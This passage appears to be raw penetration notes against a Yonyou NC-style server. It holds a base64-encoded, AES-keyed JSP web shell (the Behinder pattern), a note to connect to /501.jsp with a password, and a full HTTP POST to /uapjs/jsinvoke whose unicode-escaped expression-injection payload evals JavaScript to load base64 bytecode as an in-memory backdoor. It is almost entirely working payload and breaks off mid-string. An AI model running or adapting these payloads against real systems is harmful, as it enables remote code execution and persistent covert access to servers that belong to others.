&quot;PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT4KPCUhXHUwMDYzXHUwMDZjXHUwMDYxXHUwMDczXHUwMDczXHUwMDIwXHUwMDU1XHUwMDIwXHUwMDY1XHUwMDc4XHUwMDc0XHUwMDY1XHUwMDZlXHUwMDY0XHUwMDczXHUwMDIwXHUwMDQzXHUwMDZjXHUwMDYxXHUwMDczXHUwMDczXHUwMDRjXHUwMDZmXHUwMDYxXHUwMDY0XHUwMDY1XHUwMDcyXHUwMDdiXHUwMDU1XHUwMDI4XHUwMDQzXHUwMDZjXHUwMDYxXHUwMDczXHUwMDczXHUwMDRjXHUwMDZmXHUwMDYxXHUwMDY0XHUwMDY1XHUwMDcyXHUwMDIwXHUwMDYzXHUwMDI5XHUwMDdiXHUwMDczXHUwMDc1XHUwMDcwXHUwMDY1XHUwMDcyXHUwMDI4XHUwMDYzXHUwMDI5XHUwMDNiXHUwMDdkXHUwMDcwXHUwMDc1XHUwMDYyXHUwMDZjXHUwMDY5XHUwMDYzXHUwMDIwXHUwMDQzXHUwMDZjXHUwMDYxXHUwMDczXHUwMDczXHUwMDIwXHUwMDY3XHUwMDI4XHUwMDYyXHUwMDc5XHUwMDc0XHUwMDY1XHUwMDIwXHUwMDViXHUwMDVkXHUwMDYyXHUwMDI5XHUwMDdiXHUwMDcyXHUwMDY1XHUwMDc0XHUwMDc1XHUwMDcyXHUwMDZlXHUwMDIwXHUwMDczXHUwMDc1XHUwMDcwXHUwMDY1XHUwMDcyXHUwMDJlXHUwMDY0XHUwMDY1XHUwMDY2XHUwMDY5XHUwMDZlXHUwMDY1XHUwMDQzXHUwMDZjXHUwMDYxXHUwMDczXHUwMDczXHUwMDI4XHUwMDYyXHUwMDJjXHUwMDMwXHUwMDJjXHUwMDYyXHUwMDJlXHUwMDZjXHUwMDY1XHUwMDZlXHUwMDY3XHUwMDc0XHUwMDY4XHUwMDI5XHUwMDNiXHUwMDdkXHUwMDdkJT4KPCVcdTAwNjlcdTAwNjZcdTAwMjBcdTAwMjhcdTAwNzJcdTAwNjVcdTAwNzFcdTAwNzVcdTAwNjVcdTAwNzNcdTAwNzRcdTAwMmVcdTAwNjdcdTAwNjVcdTAwNzRcdTAwNGRcdTAwNjVcdTAwNzRcdTAwNjhcdTAwNmZcdTAwNjRcdTAwMjhcdTAwMjlcdTAwMmVcdTAwNjVcdTAwNzFcdTAwNzVcdTAwNjFcdTAwNmNcdTAwNzNcdTAwMjhcdTAwMjJcdTAwNTBcdTAwNGZcdTAwNTNcdTAwNTRcdTAwMjJcdTAwMjlcdTAwMjlcdTAwN2JcdTAwNTNcdTAwNzRcdTAwNzJcdTAwNjlcdTAwNmVcdTAwNjdcdTAwMjBcdTAwNmJcdTAwM2RcdTAwMjJcdTAwNjFcdTAwMzVcdTAwNjJcdTAwMzRcdTAwMzdcdTAwNjRcdTAwNjVcdTAwNjZcdTAwNjVcdTAwNjFcdTAwNjJcdTAwNjJcdTAwMzJcdTAwNjFcdTAwNjFcdTAwMzhcdTAwMjJcdTAwM2JcdTAwNzNcdTAwNjVcdTAwNzNcdTAwNzNcdTAwNjlcdTAwNmZcdTAwNmVcdTAwMmVcdTAwNzBcdTAwNzVcdTAwNzRcdTAwNTZcdTAwNjFcdTAwNmNcdTAwNzVcdTAwNjVcdTAwMjhcdTAwMjJcdTAwNzVcdTAwMjJcdTAwMmNcdTAwNmJcdTAwMjlcdTAwM2JcdTAwNDNcdTAwNjlcdTAwNzBcdTAwNjhcdTAwNjVcdTAwNzJcdTAwMjBcdTAwNjNcdTAwM2RcdTAwNDNcdTAwNjlcdTAwNzBcdTAwNjhcdTAwNjVcdTAwNzJcdTAwMmVcdTAwNjdcdTAwNjVcdTAwNzRcdTAwNDlcdTAwNmVcdTAwNzNcdTAwNzRcdTAwNjFcdTAwNmVcdTAwNjNcdTAwNjVcdTAwMjhcdTAwMjJcdTAwNDFcdTAwNDVcdTAwNTNcdTAwMjJcdTAwMjlcdTAwM2JcdTAwNjNcdTAwMmVcdTAwNjlcdTAwNmVcdTAwNjlcdTAwNzRcdTAwMjhcdTAwMzJcdTAwMmNcdTAwNmVcdTAwNjVcdTAwNzdcdTAwMjBcdTAwNTNcdTAwNjVcdTAwNjNcdTAwNzJcdTAwNjVcdTAwNzRcdTAwNGJcdTAwNjVcdTAwNzlcdTAwNTNcdTAwNzBcdTAwNjVcdTAwNjNcdTAwMjhcdTAwNmJcdTAwMmVcdTAwNjdcdTAwNjVcdTAwNzRcdTAwNDJcdTAwNzlcdTAwNzRcdTAwNjVcdTAwNzNcdTAwMjhcdTAwMjlcdTAwMmNcdTAwMjJcdTAwNDFcdTAwNDVcdTAwNTNcdTAwMjJcdTAwMjlcdTAwMjlcdTAwM2JcdTAwNmVcdTAwNjVcdTAwNzdcdTAwMjBcdTAwNTVcdTAwMjhcdTAwNzRcdTAwNjhcdTAwNjlcdTAwNzNcdTAwMmVcdTAwNjdcdTAwNjVcdTAwNzRcdTAwNDNcdTAwNmNcdTAwNjFcdTAwNzNcdTAwNzNcdTAwMjhcdTAwMjlcdTAwMmVcdTAwNjdcdTAwNjVcdTAwNzRcdTAwNDNcdTAwNmNcdTAwNjFcdTAwNzNcdTAwNzNcdTAwNGNcdTAwNmZcdTAwNjFcdTAwNjRcdTAwNjVcdTAwNzJcdTAwMjhcdTAwMjlcdTAwMjlcdTAwMmVcdTAwNjdcdTAwMjhcdTAwNjNcdTAwMmVcdTAwNjRcdTAwNmZcdTAwNDZcdTAwNjlcdTAwNmVcdTAwNjFcdTAwNmNcdTAwMjhcdTAwNmVcdTAwNjVcdTAwNzdcdTAwMjBcdTAwNzNcdTAwNzVcdTAwNmVcdTAwMmVcdTAwNmRcdTAwNjlcdTAwNzNcdTAwNjNcdTAwMmVcdTAwNDJcdTAwNDFcdTAwNTNcdTAwNDVcdTAwMzZcdTAwMzRcdTAwNDRcdTAwNjVcdTAwNjNcdTAwNmZcdTAwNjRcdTAwNjVcdTAwNzJcdTAwMjhcdTAwMjlcdTAwMmVcdTAwNjRcdTAwNjVcdTAwNjNcdTAwNmZcdTAwNjRcdTAwNjVcdTAwNDJcdTAwNzVcdTAwNjZcdTAwNjZcdTAwNjVcdTAwNzJcdTAwMjhcdTAwNzJcdTAwNjVcdTAwNzFcdTAwNzVcdTAwNjVcdTAwNzNcdTAwNzRcdTAwMmVcdTAwNjdcdTAwNjVcdTAwNzRcdTAwNTJcdTAwNjVcdTAwNjFcdTAwNjRcdTAwNjVcdTAwNzJcdTAwMjhcdTAwMjlcdTAwMmVcdTAwNzJcdTAwNjVcdTAwNjFcdTAwNjRcdTAwNGNcdTAwNjlcdTAwNmVcdTAwNjVcdTAwMjhcdTAwMjlcdTAwMjlcdTAwMjlcdTAwMjlcdTAwMmVcdTAwNmVcdTAwNjVcdTAwNzdcdTAwNDlcdTAwNmVcdTAwNzNcdTAwNzRcdTAwNjFcdTAwNmVcdTAwNjNcdTAwNjVcdTAwMjhcdTAwMjlcdTAwMmVcdTAwNjVcdTAwNzFcdTAwNzVcdTAwNjFcdTAwNmNcdTAwNzNcdTAwMjhcdTAwNzBcdTAwNjFcdTAwNjdcdTAwNjVcdTAwNDNcdTAwNmZcdTAwNmVcdTAwNzRcdTAwNjVcdTAwNzhcdTAwNzRcdTAwMjlcdTAwM2JcdTAwN2QlPg==&quot;;var decodeShell = new java.lang.String(decoder.decodeBuffer(shell), &quot;UTF-8&quot;);ps2.print(decodeShell);ps2.close();Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 99h=getClass&amp;a=forName&amp;b=javax.script.ScriptEngineManager&amp;c=newInstance&amp;d=getEngineByName&amp;e=js&amp;f=eval\n\n\n\n\n\n\n\n\n冰蝎连接 /501.jsp mzr@123 \n\n\n\n\n\n\n\n打入内存马POST /uapjs/jsinvoke?action=invoke HTTP/1.1Host: 172.20.10.190:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeIf-Modified-Since: Mon, 11 May 2020 15:41:36 GMTIf-None-Match: W/&quot;370397-1670602379000&quot;Content-Type: application/x-www-form-urlencodedContent-Length: 100695&#123;&quot;serviceName&quot;:&quot;nc.itf.iufo.IBaseSPService&quot;,&quot;methodName&quot;:&quot;saveXStreamConfig&quot;,&quot;parameterTypes&quot;:[&quot;java.lang.Object&quot;,&quot;java.lang.String&quot;],&quot;parameters&quot;:[&quot;\\u0024\\u007b\\u0022\\u0022\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0066\\u006f\\u0072\\u004e\\u0061\\u006d\\u0065\\u0028\\u0022\\u006a\\u0061\\u0076\\u0061\\u0078\\u002e\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u002e\\u0053\\u0063\\u0072\\u0069\\u0070\\u0074\\u0045\\u006e\\u0067\\u0069\\u006e\\u0065\\u004d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072\\u0022\\u0029\\u002e\\u006e\\u0065\\u0077\\u0049\\u006e\\u0073\\u0074\\u0061\\u006e\\u0063\\u0065\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0045\\u006e\\u0067\\u0069\\u006e\\u0065\\u0042\\u0079\\u004e\\u0061\\u006d\\u0065\\u0028\\u0027\\u006a\\u0073\\u0027\\u0029\\u002e\\u0065\\u0076\\u0061\\u006c\\u0028\\u0027\\u0076\\u0061\\u0072\\u0020\\u0063\\u006c\\u0061\\u0073\\u0073\\u004c\\u006f\\u0061\\u0064\\u0065\\u0072\\u0020\\u003d\\u0020\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u002e\\u0063\\u0075\\u0072\\u0072\\u0065\\u006e\\u0074\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0043\\u006f\\u006e\\u0074\\u0065\\u0078\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u004c\\u006f\\u0061\\u0064\\u0065\\u0072\\u0028\\u0029\\u003b\\u0074\\u0072\\u0079\\u007b\\u0063\\u006c\\u0061\\u0073\\u0073\\u004c\\u006f\\u0061\\u0064\\u0065\\u0072\\u002e\\u006c\\u006f\\u0061\\u0064\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u005c\\u0027\\u006f\\u0072\\u0067\\u002e\\u0061\\u0070\\u0061\\u0063\\u0068\\u0065\\u002e\\u0068\\u0074\\u0074\\u0070\\u002e\\u0063\\u006c\\u0069\\u0065\\u006e\\u0074\\u0073\\u002e\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0055\\u0074\\u0069\\u006c\\u005c\\u0027\\u0029\\u002e\\u006e\\u0065\\u0077\\u0049\\u006e\\u0073\\u0074\\u0061\\u006e\\u0063\\u0065\\u0028\\u0029\\u003b\\u007d\\u0063\\u0061\\u0074\\u0063\\u0068\\u0020\\u0028\\u0065\\u0029\\u007b\\u0076\\u0061\\u0072\\u0020\\u0063\\u006c\\u0073\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0020\\u003d\\u0020\\u0063\\u006c\\u0061\\u0073\\u0073\\u004c\\u006f\\u0061\\u0064\\u0065\\u0072\\u002e\\u006c\\u006f\\u0061\\u0064\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u005c\\u0027\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u005c\\u0027\\u0029\\u003b\\u0076\\u0061\\u0072\\u0020\\u0062\\u0079\\u0074\\u0065\\u0063\\u006f\\u0064\\u0065\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034\\u0020\\u003d\\u0020\\u005c\\u0027\\u0079\\u0076\\u0036\\u0036\\u0076\\u0067\\u0041\\u0041\\u0041\\u0044\\u0045\\u0042\\u0065\\u0077\\u0045\\u0041\\u0049\\u006d\\u0039\\u0079\\u005a\\u0079\\u0039\\u0068\\u0063\\u0047\\u0046\\u006a\\u0061\\u0047\\u0055\\u0076\\u0061\\u0048\\u0052\\u0030\\u0063\\u0043\\u0039\\u006a\\u0062\\u0047\\u006c\\u006c\\u0062\\u006e\\u0052\\u007a\\u004c\\u0031\\u004e\\u0030\\u0063\\u006d\\u006c\\u0075\\u005a\\u0031\\u0056\\u0030\\u0061\\u0057\\u0077\\u0048\\u0041\\u0041\\u0045\\u0042\\u0041\\u0042\\u0042\\u0071\\u0059\\u0058\\u005a\\u0068\\u004c\\u0032\\u0078\\u0068\\u0062\\u006d\\u0063\\u0076\\u0054\\u0032\\u004a\\u0071\\u005a\\u0057\\u004e\\u0030\\u0042\\u0077\\u0041\\u0044\\u0041\\u0051\\u0041\\u004d\\u005a\\u0032\\u0056\\u0030\\u0051\\u0032\\u0078\\u0068\\u0063\\u0033\\u004e\\u004f\\u0059\\u0057\\u0031\\u006c\\u0041\\u0051\\u0041\\u0055\\u004b\\u0043\\u006c\\u004d\\u0061\\u006d\\u0046\\u0032\\u0059\\u0053\\u0039\\u0073\\u0059\\u0057\\u0035\\u006e\\u004c\\u0031\\u004e\\u0030\\u0063\\u006d\\u006c\\u0075\\u005a\\u007a\\u0073\\u0042\\u0041\\u0041\\u0052\\u0044\\u0062\\u0032\\u0052\\u006c\\u0041\\u0051\\u0041\\u006d\\u0062\\u0033\\u004a\\u006e\\u004c\\u006d\\u0046\\u0077\\u0059\\u0057\\u004e\\u006f\\u005a\\u0053\\u0035\\u0054\\u005a\\u0058\\u004a\\u0032\\u0062\\u0047\\u0056\\u0030\\u0051\\u0032\\u0039\\u0075\\u0064\\u0047\\u0056\\u0034\\u0064\\u0045\\u0039\\u006a\\u0063\\u0057\\u0035\\u0073\\u0054\\u0047\\u006c\\u007a\\u0064\\u0047\\u0056\\u0075\\u005a\\u0058\\u0049\\u0049\\u0041\\u0041\\u0067\\u0042\\u0041\\u0041\\u0039\\u006e\\u005a\\u0058\\u0052\\u0043\\u0059\\u0058\\u004e\\u006c\\u004e\\u006a\\u0052\\u0054\\u0064\\u0048\\u004a\\u0070\\u0062\\u006d\\u0063\\u0042\\u0041\\u0041\\u0070\\u0046\\u0065\\u0047\\u004e\\u006c\\u0063\\u0048\\u0052\\u0070\\u0062\\u0032\\u0035\\u007a\\u0041\\u0051\\u0041\\u0054\\u0061\\u006d\\u0046\\u0032\\u0059\\u0053\\u0039\\u0070\\u0062\\u0079\\u0039\\u004a\\u0054\\u0030\\u0056\\u0034\\u0059\\u0032\\u0056\\u0077\\u0064\\u0047\\u006c\\u0076\\u0062\\u0067\\u0063\\u0041\\u0044\\u0041\\u0045\\u0041\\u0045\\u0047\\u0070\\u0068\\u0064\\u006d\\u0045\\u0076\\u0062\\u0047\\u0046\\u0075\\u005a\\u0079\\u0039\\u0054\\u0064\\u0048\\u004a\\u0070\\u0062\\u006d\\u0063\\u0048\\u0041\\u0041\\u0034\\u0042\\u0043\\u0039\\u0068\\u0049\\u004e\\u0048\\u004e\\u004a\\u0051\\u0055\\u0046\\u0042\\u0051\\u0055\\u0046\\u0042\\u0051\\u0055\\u0046\\u0042\\u0053\\u0054\\u0046\\u0059\\u005a\\u0056\\u005a\\u0033\\u0056\\u0054\\u0056\\u0034\\u0062\\u0043\\u0074\\u0051\\u0062\\u006c\\u0070\\u006f\\u0062\\u0047\\u0031\\u0056\\u004d\\u0057\\u004e\\u0057\\u0052\\u0055\\u0056\\u0055\\u005a\\u0045\\u0039\\u0076\\u0056\\u0056\\u0064\\u0047\\u0057\\u006c\\u0064\\u0044\\u0056\\u0057\\u0046\\u0047\\u0057\\u0045\\u0074\\u0043\\u005a\\u0032\\u0068\\u0042\\u0051\\u006d\\u0070\\u0036\\u0056\\u0056\\u006c\\u004b\\u0051\\u0031\\u006c\\u006b\\u0061\\u0047\\u0064\\u0049\\u0052\\u0033\\u004a\\u004d\\u0064\\u006b\\u0078\\u0036\\u0051\\u0033\\u0064\\u0053\\u004d\\u006a\\u0056\\u006e\\u004d\\u006e\\u0052\\u006c\\u0062\\u0056\\u005a\\u0077\\u0062\\u006d\\u005a\\u0055\\u004f\\u0055\\u0051\\u0032\\u0055\\u007a\\u0042\\u0071\\u0059\\u0054\\u0049\\u0078\\u0056\\u0046\\u006c\\u0031\\u0053\\u0033\\u0052\\u0056\\u0057\\u0057\\u0055\\u0032\\u0055\\u006b\\u0034\\u0033\\u0065\\u0055\\u0038\\u0035\\u004e\\u007a\\u0064\\u0030\\u0063\\u0043\\u0073\\u007a\\u004c\\u0079\\u0039\\u0054\\u005a\\u0046\\u0042\\u0075\\u0062\\u0058\\u0068\\u0072\\u0056\\u0030\\u005a\\u006f\\u0059\\u006e\\u0067\\u0035\\u004f\\u0058\\u0056\\u006b\\u004e\\u0043\\u0039\\u0032\\u005a\\u0054\\u006b\\u007a\\u0062\\u006d\\u0059\\u0033\\u004d\\u0032\\u0031\\u0051\\u004e\\u007a\\u0056\\u007a\\u0057\\u0043\\u0039\\u0075\\u005a\\u0069\\u0074\\u004a\\u0062\\u0030\\u004e\\u004f\\u004b\\u0030\\u006b\\u0076\\u0051\\u0058\\u0056\\u0077\\u0055\\u0054\\u0056\\u0047\\u0052\\u006c\\u0042\\u0055\\u0063\\u0057\\u0070\\u0068\\u0063\\u0033\\u0067\\u0072\\u0053\\u007a\\u005a\\u0050\\u0057\\u006e\\u004a\\u0052\\u004e\\u0032\\u0055\\u0079\\u0063\\u0048\\u0042\\u004c\\u004d\\u0047\\u005a\\u0030\\u0057\\u0047\\u0052\\u0079\\u0053\\u0054\\u0068\\u0073\\u0052\\u0058\\u0041\\u0079\\u0053\\u0046\\u0070\\u006c\\u0062\\u0045\\u006b\\u007a\\u0052\\u006c\\u0046\\u0070\\u0051\\u006c\\u0070\\u005a\\u005a\\u006c\\u005a\\u0056\\u0056\\u0046\\u0064\\u0058\\u0056\\u0055\\u0070\\u004f\\u0052\\u0048\\u004e\\u006c\\u004d\\u0045\\u006f\\u0078\\u0059\\u006b\\u006b\\u0032\\u0056\\u0053\\u0074\\u0078\\u0051\\u0057\\u0035\\u0051\\u0053\\u0055\\u006f\\u007a\\u0051\\u0032\\u006c\\u0075\\u0061\\u006e\\u004e\\u005a\\u0063\\u0030\\u0059\\u0079\\u0052\\u0055\\u0074\\u0068\\u0057\\u006a\\u0067\\u0072\\u0061\\u0033\\u0052\\u0046\\u0064\\u0047\\u0056\\u0034\\u0063\\u0057\\u0074\\u0058\\u0053\\u0030\\u0052\\u0072\\u0052\\u006d\\u006c\\u004f\\u0063\\u0044\\u004a\\u004d\\u0059\\u0030\\u006f\\u0072\\u0053\\u0033\\u0042\\u0079\\u005a\\u0057\\u0064\\u0055\\u004f\\u0044\\u0049\\u0078\\u0054\\u0055\\u0052\\u0031\\u0063\\u0030\\u0045\\u0078\\u0062\\u006c\\u0056\\u0061\\u0055\\u007a\\u0063\\u0034\\u004e\\u0047\\u004d\\u0032\\u005a\\u0047\\u005a\\u004f\\u004c\\u0031\\u0064\\u0077\\u004c\\u0032\\u0064\\u0070\\u0055\\u0047\\u0068\\u0036\\u0063\\u0046\\u004e\\u0074\\u0053\\u006d\\u0035\\u0077\\u0056\\u0054\\u0041\\u0031\\u0052\\u0048\\u0059\\u007a\\u0063\\u0055\\u0052\\u006d\\u0053\\u0047\\u0070\\u005a\\u0063\\u0032\\u0064\\u006c\\u0063\\u006b\\u0039\\u0078\\u004c\\u0030\\u0038\\u0032\\u0053\\u0031\\u0046\\u0052\\u0052\\u006d\\u0064\\u0054\\u0052\\u0044\\u0068\\u0058\\u0051\\u0033\\u006c\\u0033\\u0062\\u0033\\u004a\\u0078\\u0065\\u006d\\u0039\\u0051\\u004f\\u0055\\u0034\\u0077\\u005a\\u007a\\u004a\\u006f\\u0051\\u0031\\u004e\\u0035\\u005a\\u006c\\u006f\\u0078\\u004e\\u006b\\u004e\\u0059\\u0051\\u0033\\u0052\\u0043\\u0065\\u0057\\u006c\\u0072\\u004d\\u0031\\u004a\\u0043\\u0063\\u0058\\u0045\\u0072\\u004d\\u0058\\u0042\\u0078\\u0057\\u006e\\u004e\\u007a\\u004d\\u006d\\u004e\\u0068\\u004e\\u0057\\u005a\\u0076\\u0053\\u0032\\u006c\\u0032\\u0055\\u006d\\u0046\\u0043\\u0063\\u0031\\u0046\\u0043\\u004c\\u0032\\u0074\\u006a\\u0063\\u0048\\u0068\\u0034\\u0064\\u0032\\u0078\\u004c\\u004f\\u0047\\u0038\\u0079\\u0054\\u0033\\u0056\\u0052\\u005a\\u0032\\u0068\\u0057\\u0056\\u0030\\u004e\\u0047\\u0061\\u0046\\u005a\\u0033\\u0063\\u0047\\u004e\\u0068\\u004e\\u0033\\u0042\\u004e\\u004e\\u0032\\u0056\\u0045\\u005a\\u006c\\u0052\\u004a\\u004d\\u0033\\u0042\\u0042\\u0064\\u0033\\u006c\\u004e\\u004e\\u0069\\u0073\\u0031\\u004f\\u0047\\u0035\\u004d\\u0059\\u0055\\u0038\\u0032\\u0061\\u0032\\u0035\\u0069\\u0059\\u0032\\u0049\\u007a\\u0059\\u0032\\u0031\\u0071\\u0063\\u0032\\u0068\\u007a\\u0054\\u0031\\u006c\\u0078\\u0064\\u0045\\u0056\\u0074\\u0065\\u0056\\u006f\\u0033\\u005a\\u0055\\u0052\\u004a\\u0056\\u0045\\u0068\\u0056\\u0061\\u0045\\u0068\\u0047\\u0054\\u0056\\u0064\\u0070\\u004e\\u006d\\u0059\\u0035\\u0063\\u006c\\u0051\\u0078\\u0063\\u0055\\u0074\\u0068\\u0062\\u006d\\u004a\\u0054\\u0054\\u0031\\u005a\\u0057\\u0054\\u0045\\u004e\\u0068\\u0051\\u0079\\u0039\\u006a\\u0064\\u0030\\u0035\\u0059\\u0054\\u0058\\u004e\\u0069\\u0059\\u0057\\u0052\\u0070\\u004d\\u006a\\u0051\\u007a\\u004d\\u0045\\u0031\\u0050\\u0061\\u0031\\u004a\\u0044\\u0053\\u006d\\u006b\\u0032\\u0062\\u0046\\u0055\\u0030\\u0062\\u0045\\u0078\\u0057\\u004d\\u0055\\u0064\\u004b\\u0064\\u0043\\u0039\\u007a\\u0063\\u0030\\u0063\\u0079\\u0062\\u006c\\u006b\\u0072\\u004d\\u006a\\u0067\\u0031\\u0054\\u0033\\u006b\\u0033\\u0061\\u0033\\u0052\\u0053\\u0055\\u0030\\u0078\\u004f\\u004d\\u006e\\u006c\\u0044\\u0051\\u007a\\u0046\\u0033\\u0064\\u0079\\u0039\\u0034\\u0053\\u0032\\u0070\\u006e\\u0055\\u0030\\u005a\\u006d\\u0059\\u0057\\u0034\\u0072\\u0064\\u0033\\u0070\\u004b\\u0054\\u0045\\u0068\\u004f\\u0059\\u0033\\u006c\\u0030\\u0063\\u0045\\u0064\\u004a\\u005a\\u0047\\u0046\\u0073\\u0063\\u0045\\u004e\\u006c\\u0053\\u0058\\u0052\\u0052\\u0052\\u0030\\u0051\\u0035\\u005a\\u0033\\u0042\\u005a\\u005a\\u0046\\u0046\\u006c\\u0063\\u0058\\u004e\\u0058\\u0063\\u0045\\u0046\\u0061\\u0051\\u006c\\u0068\\u0056\\u0051\\u0032\\u0045\\u0032\\u004f\\u0045\\u0074\\u0055\\u004d\\u0045\\u0064\\u004e\\u0063\\u0032\\u004a\\u0078\\u004e\\u006c\\u004a\\u0054\\u0064\\u006c\\u006c\\u004c\\u0053\\u0045\\u0051\\u0035\\u0062\\u0047\\u0052\\u006c\\u0063\\u0054\\u0052\\u0044\\u0059\\u0055\\u004a\\u0053\\u0057\\u0047\\u0035\\u004d\\u0056\\u006b\\u0078\\u0044\\u0057\\u006c\\u0045\\u007a\\u0052\\u006d\\u0049\\u0078\\u005a\\u0054\\u0064\\u0075\\u0062\\u0054\\u0046\\u006a\\u0053\\u006c\\u004d\\u0030\\u0057\\u006a\\u0042\\u0050\\u004f\\u0054\\u0068\\u0055\\u004f\\u0047\\u0078\\u006f\\u005a\\u0047\\u004d\\u0034\\u0056\\u0032\\u0039\\u004e\\u004b\\u0031\\u0063\\u0079\\u0057\\u0057\\u0078\\u007a\\u0055\\u0054\\u006c\\u0058\\u005a\\u0031\\u0056\\u0044\\u0051\\u0054\\u0064\\u0079\\u0054\\u0058\\u004a\\u0031\\u004e\\u007a\\u0046\\u0054\\u0054\\u006b\\u0039\\u007a\\u0056\\u0054\\u004e\\u0049\\u0055\\u0045\\u0063\\u0032\\u0059\\u006c\\u004a\\u0075\\u0053\\u0030\\u006c\\u007a\\u0063\\u006d\\u005a\\u006e\\u004d\\u0057\\u0078\\u004a\\u0056\\u0057\\u0064\\u0068\\u0056\\u006d\\u0046\\u0054\\u0062\\u0056\\u0042\\u0030\\u0061\\u006d\\u0035\\u006e\\u0064\\u0055\\u0077\\u0076\\u0054\\u006d\\u0074\\u0068\\u0064\\u0033\\u0046\\u0077\\u004d\\u007a\\u0052\\u0049\\u0062\\u0055\\u0031\\u0074\\u0065\\u0055\\u0046\\u0079\\u0051\\u0057\\u005a\\u0059\\u0056\\u006b\\u006b\\u0072\\u0059\\u0058\\u006c\\u0050\\u005a\\u0032\\u0067\\u0033\\u0053\\u0045\\u004a\\u006f\\u0056\\u007a\\u0056\\u0075\\u004d\\u0058\\u004d\\u0033\\u0056\\u0056\\u0055\\u0033\\u0052\\u0031\\u0045\\u0079\\u0059\\u0057\\u0046\\u0034\\u0061\\u007a\\u0046\\u0056\\u0061\\u0058\\u006c\\u006b\\u0052\\u006d\\u004a\\u0074\\u0062\\u0047\\u0056\\u0035\\u0064\\u0032\\u0046\\u007a\\u0059\\u006d\\u0078\\u0052\\u0063\\u0045\\u0074\\u0068\\u004d\\u0032\\u0078\\u0053\\u0065\\u006b\\u0031\\u004a\\u0055\\u0055\\u0038\\u007a\\u0051\\u006d\\u0078\\u0046\\u0054\\u007a\\u004e\\u005a\\u0053\\u006c\\u005a\\u0042\\u0065\\u0045\\u0035\\u0072\\u004f\\u0058\\u0068\\u0074\\u0063\\u0047\\u0038\\u0033\\u0061\\u0030\\u0064\\u004f\\u0062\\u0054\\u0064\\u006a\\u0052\\u0044\\u0059\\u0032\\u0065\\u006b\\u0031\\u0033\\u0062\\u0057\\u004a\\u0030\\u004e\\u006a\\u0068\\u0045\\u0059\\u0055\\u0056\\u004d\\u004d\\u0031\\u0056\\u0049\\u004e\\u006e\\u0059\\u0031\\u0063\\u0031\\u0056\\u0050\\u0061\\u006b\\u0068\\u0033\\u0061\\u0032\\u0035\\u0071\\u004d\\u0055\\u0068\\u0051\\u0054\\u0047\\u0035\\u0077\\u0053\\u0045\\u0056\\u004a\\u005a\\u0054\\u0064\\u0047\\u0055\\u0047\\u004e\\u006f\\u0053\\u006d\\u0034\\u0076\\u0053\\u0031\\u0070\\u0045\\u004d\\u0030\\u0073\\u0031\\u0059\\u0058\\u0063\\u0077\\u004e\\u006c\\u006b\\u0033\\u0064\\u0033\\u0046\\u0070\\u0051\\u006a\\u0052\\u007a\\u0052\\u0048\\u0046\\u0048\\u0056\\u0079\\u0074\\u0077\\u0065\\u006b\\u0034\\u0077\\u005a\\u0069\\u0074\\u0032\\u0054\\u0054\\u006c\\u006c\\u004c\\u0033\\u0056\\u0051\\u004e\\u006e\\u0068\\u0079\\u005a\\u0048\\u0052\\u0051\\u0059\\u0032\\u0074\\u0061\\u0063\\u0054\\u0056\\u0052\\u0065\\u0055\\u0067\\u0077\\u004e\\u0047\\u0031\\u0042\\u0057\\u006d\\u004a\\u0072\\u0057\\u006d\\u005a\\u0042\\u0052\\u0033\\u004e\\u0045\\u0056\\u0030\\u0030\\u0076\\u0062\\u0057\\u0078\\u0042\\u0062\\u006d\\u0064\\u0051\\u0061\\u006d\\u004a\\u0052\\u0054\\u006b\\u005a\\u0030\\u0055\\u0045\\u004e\\u004c\\u0062\\u0032\\u004a\\u0042\\u0065\\u006d\\u0046\\u007a\\u0051\\u0055\\u0045\\u0077\\u004e\\u0057\\u0064\\u0058\\u0052\\u0055\\u005a\\u0047\\u0057\\u0057\\u0068\\u007a\\u0051\\u0056\\u0064\\u007a\\u004f\\u0055\\u006c\\u0052\\u0065\\u0045\\u0046\\u004d\\u004f\\u0045\\u0031\\u0074\\u0052\\u0045\\u0035\\u004d\\u0055\\u0044\\u0056\\u0030\\u0057\\u006a\\u0052\\u0042\\u0054\\u0055\\u0035\\u006c\\u004d\\u0044\\u0056\\u0071\\u0056\\u006b\\u0064\\u006f\\u0055\\u0033\\u0064\\u0061\\u0063\\u0033\\u0052\\u004a\\u0056\\u0057\\u0074\\u006d\\u0055\\u0033\\u004e\\u0073\\u0056\\u0030\\u0064\\u0055\\u0059\\u0055\\u004a\\u0074\\u004d\\u0033\\u0056\\u0035\\u0057\\u006a\\u004e\\u0057\\u0057\\u006b\\u004e\\u0054\\u0054\\u0030\\u004a\\u004a\\u0052\\u0056\\u0042\\u006c\\u0052\\u0044\\u004e\\u004d\\u004e\\u0044\\u005a\\u0055\\u004f\\u0045\\u004a\\u004c\\u004e\\u006e\\u0068\\u0076\\u0065\\u006c\\u0064\\u0036\\u0054\\u006a\\u0046\\u006c\\u004e\\u0057\\u004d\\u0072\\u0052\\u006e\\u0056\\u006c\\u0059\\u006d\\u0064\\u0071\\u0055\\u006c\\u0068\\u0052\\u0061\\u0030\\u0031\\u0030\\u00